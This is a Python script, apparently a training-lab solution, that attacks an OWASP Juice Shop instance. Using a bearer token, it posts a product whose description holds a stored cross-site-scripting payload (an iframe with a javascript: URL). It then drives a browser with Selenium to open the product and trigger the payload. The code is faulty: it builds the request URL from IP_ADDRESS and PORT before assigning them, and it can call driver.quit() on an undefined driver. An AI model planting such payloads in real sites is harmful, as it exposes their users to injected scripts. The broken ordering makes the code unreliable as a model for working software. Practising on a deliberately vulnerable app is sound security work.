import requests
import os
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

try:
	headers = {
		'Content-Type': 'application/json',
		'Authorization': os.environ['OWASP_JUICE_SHOP_BEARER_TOKEN']
	}

	target_text = "1Apple Pomace XSS 123"
	
	# Define the API endpoint URL
	url = f"http://{IP_ADDRESS}:{PORT}/api/Products"

	# Prepare the JSON payload for the request body
	payload = {"name": target_text, "description": "<iframe src=\"javascript:alert('xss')\">", "price": 47.11}

	# Send the POST request with the JSON payload
	response = requests.post(url, json=payload, headers=headers)

	# Print the response status code and JSON content
	print(f"Status Code: {response.status_code}")
	print(f"Response Body: {response.json()}")

	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
	driver = webdriver.Chrome()
	driver.get(f"http://{IP_ADDRESS}:{PORT}/#/search")

	xpath_expression = f"//img[@alt='{target_text}']"

	# Open the product listing to execute the XSS payload
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, xpath_expression))).click()
	input("Press Enter...")

except Exception as e:
    print(f"An error occurred: {e}")

finally:
  driver.quit()
